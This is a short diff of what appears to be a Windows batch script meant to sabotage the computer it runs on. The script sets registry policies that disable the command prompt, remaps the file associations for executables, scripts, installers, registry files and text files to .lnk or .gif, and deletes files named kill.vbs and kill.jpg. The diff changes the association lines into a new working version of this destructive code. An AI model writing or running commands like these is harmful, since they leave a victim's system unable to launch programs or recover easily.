@@ -17,14 +17,16 @@ REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Ex
 REG ADD "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System" /v "DisableCMD" /t REG_DWORD /d 1 /f
 RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
 
-assoc .exe=.gif
-assoc .com=.gif
-assoc .reg=.gif
-assoc .cmd=.gif
-assoc .vbs=.gif
-assoc .bat=.gif
-assoc .txt=.gif
-assoc .msi=.gif
+
+assoc .lnk=.gif
+assoc .exe=.lnk
+assoc .com=.lnk
+assoc .reg=.lnk
+assoc .cmd=.lnk
+assoc .vbs=.lnk
+assoc .bat=.lnk
+assoc .txt=.lnk
+assoc .msi=.lnk
 
 del kill.vbs
 del kill.jpg
